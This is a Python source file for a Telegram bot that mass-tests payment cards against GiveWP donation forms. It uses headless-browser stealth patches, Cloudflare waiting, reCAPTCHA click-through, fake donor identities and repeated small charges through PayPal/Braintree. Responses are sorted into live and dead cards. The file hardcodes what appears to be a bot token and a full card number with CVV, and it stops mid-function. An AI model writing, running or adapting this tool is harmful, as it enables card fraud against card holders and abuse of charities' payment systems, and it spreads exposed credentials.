#!/usr/bin/env python3
"""
GiveWP Bot — Complete Edition (Final)
======================================
- Playwright + requests + كل الاستراتيجيات
- يستخرج كل الحقول (hidden/select/radio/checkbox/textarea)
- يملأ billing + branch_selection + terms + honoree تلقائياً
- يجرب كل الـ gateways (paypal-commerce, paypal, paypal_standard)
- يجرب كل المبالغ (1, 2, 5, 10, min, levels)
- يعترض الردود من الشبكة + يقرأ من الصفحة
- يطلع RAW response كامل
- يشتغل حتى لو مفيش form في HTML (iframe)
- يشتغل حتى لو مفيش token (site-first strategy)
- يتعامل مع Cloudflare + CAPTCHA (أفضل مجهود)
"""

import os
import sys
import asyncio
import json
import re
import time
import random
import threading
import traceback
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
# ENV SETUP
# ═══════════════════════════════════════════════════════════════
os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8407490230:AAGIDHEYTwvNomiBas_yk4ezIalvweFAQro")
OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
ADMINS = [str(OWNER_ID)]
TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")

# ═══════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════
import telebot
from telebot import types
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

try:
    from fake_useragent import UserAgent
    _UA = UserAgent()
    def random_ua():
        try: return _UA.random
        except: return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
except:
    def random_ua():
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
        ])

try:
    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("⚠️ Playwright not installed — only requests strategy will work")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
processing_status = {}


# ═══════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════
PAYPAL_METADATA_ID = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
STREETS = ["123 Main Street", "456 Oak Avenue", "789 Pine Road", "321 Elm Boulevard"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"]
STATES = ["NY", "CA", "IL", "TX", "AZ", "PA", "FL", "OH"]
ZIPS = ["10001", "90001", "60601", "77001", "85001", "19101", "33101", "44101"]
COUNTRIES = ["US", "United States"]

AMOUNTS_TO_TRY = ["1", "2", "3", "5", "10", "20", "25", "50", "100"]
GATEWAYS_TO_TRY = ["paypal-commerce", "paypal", "paypal_standard", "give_paypal"]


# ═══════════════════════════════════════════════════════════════
# CLASSIFIER
# ═══════════════════════════════════════════════════════════════
class Classifier:
    LIVE = [
        ("CHARGE_SUCCESS", ["success", "approved", "charged", "completed",
                            "thank you", "payment successful", "donation complete",
                            "status\":\"COMPLETED", "donation was successful"]),
        ("ORDER_NOT_APPROVED", ["order_not_approved", "not yet approved"]),
        ("APPROVED_PENDING_CAPTURE", ["paypal orders are captured", "pending capture"]),
        ("INSUFFICIENT_FUNDS", ["insufficient", "not enough", "nsf"]),
        ("DO_NOT_HONOR", ["do not honor"]),
        ("ACCOUNT_CLOSED", ["account closed", "account locked"]),
        ("CVV_FAILURE", ["cvv", "security code", "cvv2"]),
        ("EXPIRED_CARD", ["expired", "expiration"]),
        ("SUSPECTED_FRAUD", ["suspected fraud", "fraud"]),
        ("PAYER_CANNOT_PAY", ["payer cannot pay", "cannot pay", "payee blocked"]),
        ("GENERIC_DECLINE", ["generic decline"]),
        ("RESTRICTED", ["restricted", "blocked", "inactive"]),
        ("INVALID_CARD", ["invalid card", "invalid number", "invalid or restricted"]),
        ("3DS_REQUIRED", ["authentication required", "3d secure", "sca required"]),
        ("PAYER_ACTION_REQUIRED", ["payer action required"]),
        ("LIMIT_EXCEEDED", ["limit exceeded", "attempts exceed", "tx_attempts"]),
        ("SECURITY_VIOLATION", ["security violation"]),
        ("COMPLIANCE_VIOLATION", ["compliance violation"]),
        ("TRANSACTION_NOT_PERMITTED", ["transaction not permitted"]),
        ("PAYMENT_DENIED", ["payment denied"]),
    ]

    DEAD = [
        ("CLOUDFLARE", ["just a moment", "checking your browser", "verifying you are",
                        "cf-browser-verification", "cf_chl", "challenge-platform"]),
        ("CAPTCHA", ["captcha", "not a robot", "recaptcha", "hcaptcha", "turnstile"]),
        ("GATEWAY_DISABLED", ["gateway is not enabled", "payment gateway is not",
                              "gateway not available"]),
        ("JS_CONFLICT", ["javascript conflict", "connection between this site"]),
        ("FORM_NOT_PUBLISHED", ["form not published", "no form"]),
        ("AMOUNT_INVALID", ["donation amount", "invalid amount", "minimum donation"]),
        ("SPAM", ["flagged as spam", "spam"]),
        ("FIELDS_REQUIRED", ["required field", "billing address", "please enter"]),
        ("BRANCH_REQUIRED", ["branch_selection"]),
        ("TERMS_REQUIRED", ["agree_to_terms", "terms and conditions"]),
        ("HONOREE_REQUIRED", ["honoree"]),
        ("NO_FORM", ["form not found", "no donation form"]),
        ("NO_PAYPAL", ["paypal not available", "paypal is not"]),
    ]

    @classmethod
    def classify(cls, text):
        if not text:
            return "DEAD", "EMPTY"
        low = text.lower()
        for code, kws in cls.DEAD:
            for kw in kws:
                if kw in low:
                    return "DEAD", code
        for code, kws in cls.LIVE:
            for kw in kws:
                if kw in low:
                    return "LIVE", code
        return "UNKNOWN", "UNKNOWN"


# ═══════════════════════════════════════════════════════════════
# PLAYWRIGHT ENGINE
# ═══════════════════════════════════════════════════════════════
class PlaywrightEngine:
    def __init__(self, url, card, verbose=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.debug = {
            "steps": [],
            "network": [],
            "paypal": [],
            "form_found": None,
            "amount_selected": None,
            "paypal_frame": False,
            "card_filled": False,
            "captcha_detected": False,
        }

    def log(self, msg):
        if self.verbose:
            print(msg)
        self.debug["steps"].append(msg)

    async def _on_response(self, response):
        try:
            u = response.url
            if any(k in u for k in ["create_order", "confirm-payment", "approve_order",
                                     "checkout/orders", "admin-ajax.php", "give_process"]):
                body = ""
                try:
                    body = await response.text()
                except:
                    pass
                self.debug["network"].append({
                    "url": u[:150],
                    "status": response.status,
                    "body": body[:1500],
                })
                if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
                    self.debug["paypal"].append({
                        "status": response.status,
                        "body": body[:1500],
                    })
        except:
            pass

    async def run(self):
        if not HAS_PW:
            return {"status": "DEAD", "code": "NO_PLAYWRIGHT", "debug": self.debug}

        async with async_playwright() as p:
            self.log("🚀 launching chromium...")
            try:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        "--no-sandbox",
                        "--disable-setuid-sandbox",
                        "--disable-blink-features=AutomationControlled",
                        "--disable-dev-shm-usage",
                        "--disable-gpu",
                        "--no-first-run",
                        "--no-zygote",
                        "--single-process",
                        "--disable-features=IsolateOrigins,site-per-process",
                        "--disable-web-security",
                        "--ignore-certificate-errors",
                        "--allow-running-insecure-content",
                    ],
                )
            except Exception as e:
                return {"status": "DEAD", "code": f"LAUNCH_FAILED: {str(e)[:120]}",
                        "debug": self.debug}

            try:
                context = await browser.new_context(
                    user_agent=random_ua(),
                    viewport={"width": 1366, "height": 900},
                    locale="en-US",
                    timezone_id="America/New_York",
                    ignore_https_errors=True,
                    java_script_enabled=True,
                )
                # stealth
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US','en']});
                    window.chrome = {runtime: {}, app: {}, csi: () => {}, loadTimes: () => {}};
                """)

                page = await context.new_page()
                page.on("response", self._on_response)

                return await self._execute(page)
            finally:
                try:
                    await browser.close()
                except:
                    pass

    async def _execute(self, page):
        # ═══ 1. Load ═══
        self.log(f"[1] goto {self.url}")
        try:
            await page.goto(self.url, wait_until="domcontentloaded", timeout=45000)
        except Exception as e:
            self.log(f"  timeout: {str(e)[:80]}")
        await asyncio.sleep(3)

        # ═══ 2. Cloudflare ═══
        html = await page.content()
        if any(x in html.lower() for x in ["just a moment", "verifying you are",
                                            "checking your browser", "cf-browser-verification"]):
            self.log("[2] cloudflare wait 25s...")
            for _ in range(5):
                await asyncio.sleep(5)
                html = await page.content()
                if "just a moment" not in html.lower() and "verifying" not in html.lower():
                    self.log("  ✅ passed")
                    break
            else:
                return {"status": "DEAD", "code": "CLOUDFLARE", "raw": "cloudflare blocked",
                        "debug": self.debug}

        # ═══ 3. CAPTCHA ═══
        if any(x in html.lower() for x in ["g-recaptcha", "hcaptcha", "turnstile"]):
            self.debug["captcha_detected"] = True
            self.log("[3] captcha detected — attempting bypass")
            await self._try_bypass_captcha(page)

        # ═══ 4. Find form ═══
        self.log("[4] find form")
        form_info = await self._find_form(page)
        if not form_info:
            return {"status": "DEAD", "code": "NO_FORM",
                    "raw": "give form not found",
                    "debug": self.debug}
        self.debug["form_found"] = form_info["type"]
        self.log(f"  ✅ form: {form_info['type']}")

        # ═══ 5. Fill personal ═══
        self.log("[5] fill personal")
        await self._fill_personal(page)

        # ═══ 6. Select amount ═══
        self.log("[6] select amount")
        amount = await self._select_amount(page)
        self.debug["amount_selected"] = amount
        if amount:
            self.log(f"  ✅ ${amount}")

        # ═══ 7. Fill billing ═══
        self.log("[7] fill billing")
        await self._fill_billing(page)

        # ═══ 8. Fill all required ═══
        self.log("[8] fill required selects/radios")
        await self._fill_required(page)

        # ═══ 9. Terms ═══
        self.log("[9] terms")
        await self._check_terms(page)

        # ═══ 10. Click donate ═══
        self.log("[10] click donate")
        clicked = await self._click_donate(page)
        if not clicked:
            return {"status": "DEAD", "code": "CLICK_FAILED",
                    "raw": "donate button not clickable",
                    "debug": self.debug}

        await asyncio.sleep(4)

        # ═══ 11. Wait PayPal or result ═══
        self.log("[11] wait paypal")
        paypal = await self._wait_paypal(page, timeout=25)

        if not paypal:
            page_text = await page.inner_text("body")
            st, cd = Classifier.classify(page_text)
            if st in ("LIVE", "DEAD"):
                return {"status": st, "code": cd, "raw": page_text[:500],
                        "debug": self.debug}
            if any(x in page_text.lower() for x in ["thank", "success", "completed"]):
                return {"status": "LIVE", "code": "CHARGE_SUCCESS",
                        "raw": page_text[:500], "debug": self.debug}
            return {"status": "DEAD", "code": "NO_PAYPAL",
                    "raw": page_text[:300], "debug": self.debug}

        self.debug["paypal_frame"] = True
        self.log("  ✅ PayPal frame found")

        # ═══ 12. Fill card ═══
        self.log("[12] fill card")
        card_ok = await self._fill_card(paypal)
        self.debug["card_filled"] = card_ok
        if not card_ok:
            return {"status": "DEAD", "code": "CARD_FILL_FAILED",
                    "raw": "could not fill card fields", "debug": self.debug}

        # ═══ 13. Submit ═══
        self.log("[13] submit")
        await self._submit(paypal)

        # ═══ 14. Read result ═══
        self.log("[14] read result")
        await asyncio.sleep(5)
        return await self._read_result(page, paypal)

    # ─────────────── HELPERS ───────────────
    async def _try_bypass_captcha(self, page):
        try:
            for frame in page.frames:
                if "recaptcha" in frame.url.lower() or "hcaptcha" in frame.url.lower():
                    try:
                        checkbox = frame.locator("#recaptcha-anchor, .recaptcha-checkbox")
                        if await checkbox.count() > 0:
                            await checkbox.first.click()
                            await asyncio.sleep(3)
                    except:
                        pass
        except:
            pass

    async def _find_form(self, page):
        selectors = [
            "form.give-form",
            "form[id*='give-form']",
            ".give-form-wrap form",
            "form[class*='give']",
            "input[name='give-amount']",
        ]
        # main
        for sel in selectors:
            try:
                loc = page.locator(sel).first
                if await loc.count() > 0:
                    inputs = await page.locator(f"{sel} input").count()
                    if inputs > 0 or sel == "input[name='give-amount']":
                        return {"type": "main", "selector": sel}
            except:
                continue
        # iframes
        for frame in page.frames:
            if frame == page.main_frame:
                continue
            for sel in selectors:
                try:
                    if await frame.locator(sel).count() > 0:
                        return {"type": "iframe", "frame": frame}
                except:
                    continue
        return None

    async def _fill_personal(self, page):
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        email = f"user{int(time.time()*1000)%999999}@gmail.com"
        for frame in page.frames:
            for sel, val in [
                ("input[name='give_first']", first),
                ("input[name='give_last']", last),
                ("input[name='give_email']", email),
                ("input[name*='first_name']", first),
                ("input[name*='last_name']", last),
                ("input[type='email']", email),
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
                        await loc.fill(val)
                except:
                    continue

    async def _select_amount(self, page):
        # ابدأ بحد أدنى الفورم
        amounts = list(AMOUNTS_TO_TRY)
        for frame in page.frames:
            try:
                loc = frame.locator("input[name='give-form-minimum']").first
                if await loc.count() > 0:
                    mv = await loc.get_attribute("value")
                    if mv and float(mv) > 0:
                        if float(mv).is_integer():
                            amt = str(int(float(mv)))
                        else:
                            amt = mv
                        if amt not in amounts:
                            amounts.insert(0, amt)
            except:
                pass

        for amt in amounts:
            for frame in page.frames:
                r = await self._try_amount(frame, amt)
                if r:
                    return r
        return None

    async def _try_amount(self, frame, amt):
        # 1. input
        try:
            inp = frame.locator("input[name='give-amount']").first
            if await inp.count() > 0 and await inp.is_visible(timeout=300):
                await inp.fill(amt)
                return amt
        except:
            pass
        # 2. custom
        try:
            inp = frame.locator("input[name='give-custom-amount'], input.give-custom-amount, input[id*='custom-amount']").first
            if await inp.count() > 0 and await inp.is_visible(timeout=300):
                await inp.fill(amt)
                return amt
        except:
            pass
        # 3. data-price button
        for val in [amt, f"{amt}.00", f"{amt}.0"]:
            try:
                el = frame.locator(f"[data-price='{val}']").first
                if await el.count() > 0:
                    await el.scroll_into_view_if_needed()
                    await el.click()
                    return amt
            except:
                pass
        # 4. radio
        for val in [amt, f"{amt}.00"]:
            try:
                radio = frame.locator(f"input[type='radio'][value='{val}']").first
                if await radio.count() > 0:
                    await radio.check(force=True)
                    return amt
            except:
                pass
        # 5. button $amt
        try:
            btn = frame.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
            if await btn.count() > 0:
                await btn.click()
                return amt
        except:
            pass
        # 6. select option
        try:
            for name in ["select[name*='amount']", "select[name='give-amount']",
                         "select.give-amount", "select[id*='amount']"]:
                sel = frame.locator(name).first
                if await sel.count() > 0:
                    try:
                        await sel.select_option(amt)
                        return amt
                    except:
                        try:
                            await sel.select_option(f"{amt}.00")
                            return amt
                        except:
                            pass
        except:
            pass
        # 7. link
        try:
            link = frame.get_by_role("link", name=re.compile(rf"^\${amt}(\.00)?$")).first
            if await link.count() > 0:
                await link.click()
                return amt
        except:
            pass
        # 8. label
        try:
            lbl = frame.locator(f"label:has-text('${amt}')").first
            if await lbl.count() > 0:
                await lbl.click()
                return amt
        except:
            pass
        return None

    async def _fill_billing(self, page):
        first = random.choice(FIRST_NAMES)
        last = random.choice(LAST_NAMES)
        street = random.choice(STREETS)
        city = random.choice(CITIES)
        state = random.choice(STATES)
        zipcode = random.choice(ZIPS)

        for frame in page.frames:
            # text inputs
            for sel, val in [
                ("input[name*='billing'][name*='first']", first),
                ("input[name*='billing'][name*='last']", last),
                ("input[name*='billing_first']", first),
                ("input[name*='billing_last']", last),
                ("input[name*='address']", street),
                ("input[name*='street']", street),
                ("input[name*='city']", city),
                ("input[name*='zip']", zipcode),
                ("input[name*='postal']", zipcode),
                ("input[name*='phone']", "5551234567"),
            ]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
                        await loc.fill(val)
                except:
                    continue

            # selects
            for name in ["billing_country", "mailing_country", "card_country",
                         "give-country", "give_country"]:
                try:
                    loc = frame.locator(f"select[name*='{name}'], select[id*='{name}']").first
                    if await loc.count() > 0:
                        try:
                            await loc.select_option("US")
                        except:
                            try:
                                await loc.select_option(index=1)
                            except:
                                pass
                except:
                    continue
            for name in ["billing_state", "mailing_state", "card_state",
                         "give-state", "give_state"]:
                try:
                    loc = frame.locator(f"select[name*='{name}'], select[id*='{name}']").first
                    if await loc.count() > 0:
                        try:
                            await loc.select_option(state)
                        except:
                            try:
                                await loc.select_option(index=1)
                            except:
                                pass
                except:
                    continue

    async def _fill_required(self, page):
        for frame in page.frames:
            # selects
            try:
                selects = await frame.locator("select").all()
                for sel in selects:
                    try:
                        name = await sel.get_attribute("name") or ""
                        if any(k in name.lower() for k in ["country", "state", "billing", "mailing", "card_"]):
                            continue
                        # أول option صالح
                        opts = await sel.locator("option").all()
                        valid = []
                        for opt in opts:
                            v = await opt.get_attribute("value")
                            if v and v not in ("", "0", "-1", "placeholder"):
                                valid.append(v)
                        if valid:
                            try:
                                await sel.select_option(valid[0])
                            except:
                                pass
                    except:
                        continue
            except:
                pass

            # radios (skip payment-mode)
            try:
                radios = await frame.locator("input[type='radio']").all()
                seen = set()
                for r in radios:
                    try:
                        name = await r.get_attribute("name") or ""
                        if not name or name in seen:
                            continue
                        if any(k in name.lower() for k in ["payment-mode", "gateway"]):
                            continue
                        await r.check(force=True)
                        seen.add(name)
                    except:
                        continue
            except:
                pass

    async def _check_terms(self, page):
        for frame in page.frames:
            try:
                cbs = await frame.locator(
                    "input[type='checkbox'][name*='terms'], "
                    "input[type='checkbox'][name*='agree'], "
                    "input[type='checkbox'][name*='condition'], "
                    "input[type='checkbox'][name*='accept']"
                ).all()
                for cb in cbs:
                    try:
                        if not await cb.is_checked():
                            await cb.check(force=True)
                    except:
                        try:
                            await cb.click(force=True)
                        except:
                            pass
            except:
                continue

    async def _click_donate(self, page):
        selectors = [
            "button.give-submit",
            "input.give-submit",
            "button[type='submit'][class*='give']",
            "input[type='submit'][value*='Donate' i]",
            "button:has-text('Donate Now')",
            "button:has-text('Donate')",
            "button:has-text('Give Now')",
            "button:has-text('Give')",
            "button:has-text('Submit')",
            "button[type='submit']",
            "input[type='submit']",
        ]
        for frame in page.frames:
            for sel in selectors:
                try:
                    btn = frame.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(timeout=800):
                        await btn.scroll_into_view_if_needed()
                        await asyncio.sleep(0.3)
                        try:
                            await btn.click(timeout=5000)
                        except:
                            await btn.click(force=True, timeout=5000)
                        self.log(f"  ✅ clicked: {sel}")
                        return True
                except:
                    continue
        return False

    async def _wait_paypal(self, page, timeout=25):
        for _ in range(timeout * 2):
            # frames
            for frame in page.frames:
                if frame == page.main_frame:
                    continue
                furl = frame.url.lower()
                if any(k in furl for k in ["paypal", "braintree", "card-fields", "hosted-fields"]):
                    try:
                        if await frame.locator("input").count() > 0:
                            return frame
                    except:
                        continue
            # iframes
            try:
                iframes = await page.locator("iframe").all()
                for iframe in iframes:
                    try:
                        src = await iframe.get_attribute("src") or ""
                        title = await iframe.get_attribute("title") or ""
                        if any(k in (src + title).lower() for k in ["paypal", "braintree", "card"]):
                            fr = await iframe.content_frame()
                            if fr:
                                try:
                                    if await fr.locator("input").count() > 0:
                                        return fr
                                except:
                                    pass
                    except:
                        continue
            except:
                pass
            # inline card
            try:
                card = page.locator("input[autocomplete='cc-number'], input[name*='cardnumber']").first
                if await card.count() > 0:
                    return page
            except:
                pass
            await page.wait_for_timeout(500)
        return None

    async def _fill_card(self, frame):
        try:
            parts = self.card.strip().split("|")
            n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]

            await asyncio.sleep(2)

            # email
            for sel in ["input[type='email']", "input[name*='email']", "input[id*='email']"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0 and await loc.is_visible(timeout=300):
                        await loc.fill(f"u{int(time.time()*1000)%999999}@gmail.com")
                        break
                except:
                    continue

            # card number
            card_ok = False
            for sel in ["input#credit-card-number", "input[name='cardnumber']",
                        "input[name='card-number']", "input[name='cardNumber']",
                        "input[autocomplete='cc-number']",
                        "input[placeholder*='Card number' i]",
                        "input[placeholder*='Card Number' i]",
                        "input[type='tel'][name*='card']",
                        "input[data-testid*='card']"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(n)
                        card_ok = True
                        self.log("  ✅ card number")
                        break
                except:
                    continue
            if not card_ok:
                return False

            await asyncio.sleep(0.5)

            # expiry
            for sel in ["input#expiration-date", "input[name='exp']",
                        "input[name='expiry']", "input[name='expiration']",
                        "input[autocomplete='cc-exp']",
                        "input[placeholder*='MM / YY' i]",
                        "input[placeholder*='MM/YY' i]"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(f"{mm}/{yy}")
                        self.log("  ✅ expiry")
                        break
                except:
                    continue

            # cvc
            for sel in ["input#cvv", "input#cvc", "input[name='cvv']",
                        "input[name='cvc']", "input[name='securityCode']",
                        "input[autocomplete='cc-csc']",
                        "input[placeholder*='CVV' i]",
                        "input[placeholder*='CVC' i]"]:
                try:
                    loc = frame.locator(sel).first
                    if await loc.count() > 0:
                        await loc.fill(cvc)
                        self.log("  ✅ cvc")
                        break
                except:
                    continue

            await asyncio.sleep(0.5)
            return True
        except Exception as e:
            self.log(f"  ❌ card: {str(e)[:80]}")
            return False

    async def _submit(self, frame):
        for sel in ["button:has-text('Pay')", "button:has-text('Continue')",
                    "button:has-text('Complete')", "button:has-text('Submit')",
                    "button[type='submit']", "button#btn-pay", "button[id*='pay']"]:
            try:
                btn = frame.locator(sel).first
                if await btn.count() > 0 and await btn.is_visible(timeout=800):
                    await btn.click(timeout=5000)
                    self.log("  ✅ submitted")
                    return True
            except:
                continue
        return False

    async def _read_result(self, page, frame):
        # 1. network
        for r in self.debug["paypal"]:
            st, cd = Classifier.classify(r.get("body", ""))
            if st == "LIVE":
                return {"status": "LIVE", "code": cd,
                        "raw": r["body"][:500], "debug": self.debug}

        # 2. page text
        texts = []
        try:
            if frame:
                texts.append(await frame.inner_text("body"))
        except:
            pass
        try:
            texts.append(await page.inner_text("body"))
        except:
            pass

        for t in texts:
            if not t:
                continue
            st, cd = Classifier.classify(t)
            if st == "LIVE":
                return {"status": "LIVE", "code": cd, "raw": t[:500], "debug": self.debug}

        # 3. alerts
        try:
            alerts = await page.locator("[role='alert'], .give_error, .error, .alert").all()
            for a in alerts:
                at = await a.inner_text()
                if at:
                    st, cd = Classifier.classify(at)
                    return {"status": st, "code": cd, "raw": at[:500], "debug": self.debug}
        except:
            pass

        return {"status": "UNKNOWN", "code": "NO_RESPONSE",
                "raw": (texts[0] if texts else "")[:500], "debug": self.debug}


# ═══════════════════════════════════════════════════════════════
# REQUESTS ENGINE (Fallback — Site-first)
# ═══════════════════════════════════════════════════════════════
class RequestsEngine:
    def __init__(self, url, card, verbose=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.r = requests.Session()
        self.r.verify = False

        p = urlparse(url)
        self.host = p.netloc
        self.path = p.path + ("?" + p.query if p.query else "")
        self.base = f"https://{self.host}"

        self.form_id1 = None
        self.form_id2 = None
        self.nonce = None
        self.min_amount = None
        self.access_token = None
        self.ajax_url = f"{self.base}/wp-admin/admin-ajax.php"
        self.fields = {}
        self.levels = []
        self.gateways = []
        self.has_captcha = False

        self.debug = {"steps": [], "attempts": [], "raw": []}

    def log(self, m):
        if self.verbose:
            print(m)
        self.debug["steps"].append(m)

    def _get_page(self):
        try:
            r = self.r.get(self.url, headers={"user-agent": random_ua()},
                          timeout=30, cookies=self.r.cookies)
            html = r.text or ""
            if len(html) < 100:
                return ""
            if "give-form-id-prefix" not in html or "give-form-hash" not in html:
                for pat in [
                    r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
                    r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
                    r'<iframe[^>]*src="([^"]*donation[^"]*)"',
                ]:
                    m = re.search(pat, html, re.IGNORECASE)
                    if m:
                        iurl = m.group(1)
                        if iurl.startswith("//"): iurl = "https:" + iurl
                        elif iurl.startswith("/"): iurl = f"{self.base}{iurl}"
                        r2 = self.r.get(iurl, headers={"user-agent": random_ua()},
                                       timeout=25, cookies=self.r.cookies)
                        self.r.cookies.update(r2.cookies)
                        html = r2.text or ""
                        break
            return html
        except:
            return ""

    def _extract(self, html):
        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
        if m: self.form_id1 = m.group(1)
        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
        if m: self.form_id2 = m.group(1)
        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
        if m: self.nonce = m.group(1)
        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
        if m and m.group(1).strip(): self.min_amount = m.group(1).strip()

        # hidden
        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html):
            tag = m.group(0)
            n = re.search(r'name=["\']([^"\']+)["\']', tag)
            v = re.search(r'value=["\']([^"\']*)["\']', tag)
            if n:
                self.fields[n.group(1)] = v.group(1) if v else ""

        # selects
        for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', html, re.DOTALL):
            name = m.group(1)
            opts = re.findall(r'<option[^>]*value=["\']([^"\']*)["\']', m.group(2))
            valid = [o for o in opts if o and o not in ("", "0", "-1")]
            if valid:
                self.fields[name] = valid[0]

        # checkboxes
        for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', html):
            tag = m.group(0)
            n = re.search(r'name=["\']([^"\']+)["\']', tag)
            if n and any(k in n.group(1).lower() for k in ["terms", "agree", "accept"]):
                self.fields[n.group(1)] = "on"

        # levels
        for pat, pg, ag in [
            (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1, 2),
            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2, 1),
        ]:
            for m in re.finditer(pat, html):
                try: self.levels.append((m.group(pg), m.group(ag)))
                except: pass

        # gateways
        for m in re.finditer(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', html):
            self.gateways.append(m.group(1))

        # captcha
        if "g-recaptcha" in html or "hcaptcha" in html:
            self.has_captcha = True

        # token
        for pat in [r'"data-client-token"\s*:\s*"([^"]+)"',
                    r'"accessToken"\s*:\s*"([^"]{20,})"']:
            m = re.search(pat, html)
            if m:
                try:
                    enc = m.group(1)
                    if "client-token" in pat:
                        dec = __import__("base64").b64decode(enc).decode("utf-8", errors="ignore")
                        au = re.search(r'"accessToken":"([^"]+)"', dec)
                        if au: self.access_token = au.group(1)
                    else:
                        self.access_token = enc
                except:
                    pass

        return bool(self.form_id1 and self.nonce)

    def _build(self, gw, amt, pid, include_amt=True):
        base = {
            "give-honeypot": "",
            "give-form-id-prefix": self.form_id1 or "",
            "give-form-id": self.form_id2 or "",
            "give-form-title": "",
            "give-current-url": self.url,
            "give-form-url": self.url,
            "give-form-minimum": self.min_amount or "",
            "give-form-maximum": "999999.99",
            "give-form-hash": self.nonce or "",
            "give-price-id": pid,
            "payment-mode": gw,
            "give_first": "Test",
            "give_last": "Bot",
            "give_email": f"user{random.randint(1000,99999)}@gmail.com",
            "card_name": "Test Bot",
            "give-gateway": gw,
        }
        if include_amt:
            base["give-amount"] = amt
        for k, v in self.fields.items():
            if k not in base:
                base[k] = v
        if self.has_captcha:
            base["g-recaptcha-response"] = ""
        return MultipartEncoder({k: (None, v) for k, v in base.items()})

    def charge(self):
        result = {"status": "DEAD", "code": "UNKNOWN", "raw": "", "debug": self.debug}

        html = self._get_page()
        if not html:
            result["code"] = "GET_FAILED"
            return result

        if not self._extract(html):
            result["code"] = "FORM_NOT_FOUND"
            return result

        # تركيبات
        attempts = []
        for pid, amt in self.levels:
            attempts.append((pid, amt, True, f"level={pid}=${amt}"))
        if self.min_amount:
            attempts.append(("custom", self.min_amount, True, f"custom+min={self.min_amount}"))
        for a in AMOUNTS_TO_TRY[:4]:
            attempts.append(("custom", a, True, f"custom+{a}"))
        attempts.append(("custom", "", True, "empty"))

        gateways = self.gateways or GATEWAYS_TO_TRY

        for gw in gateways:
            for pid, amt, inc, label in attempts:
                self.log(f"[site] {gw}/{label}")
                data = self._build(gw, amt, pid, inc)
                headers = {
                    "content-type": data.content_type,
                    "origin": self.base,
                    "referer": self.url,
                    "user-agent": random_ua(),
                    "x-requested-with": "XMLHttpRequest",
                }
                try:
                    r = self.r.post(self.ajax_url,
                                   params={"action": "give_process_donation"},
                                   headers=headers, data=data,
                                   cookies=self.r.cookies, timeout=25)
                    self.debug["attempts"].append({
                        "gw": gw, "amt": amt, "pid": pid,
                        "status": r.status_code, "body": r.text[:1000],
                    })
                    st, cd = Classifier.classify(r.text)
                    if st == "LIVE":
                        result["status"] = "LIVE"
                        result["code"] = cd
                        result["raw"] = r.text[:1000]
                        return result
                    if cd in ("GATEWAY_DISABLED", "CAPTCHA"):
                        break
                except Exception as e:
                    self.log(f"  err: {str(e)[:60]}")
                    continue

        if self.debug["attempts"]:
            result["raw"] = self.debug["attempts"][-1]["body"][:1000]
        return result


# ═══════════════════════════════════════════════════════════════
# UNIFIED CHECKER
# ═══════════════════════════════════════════════════════════════
def check_site(url, card):
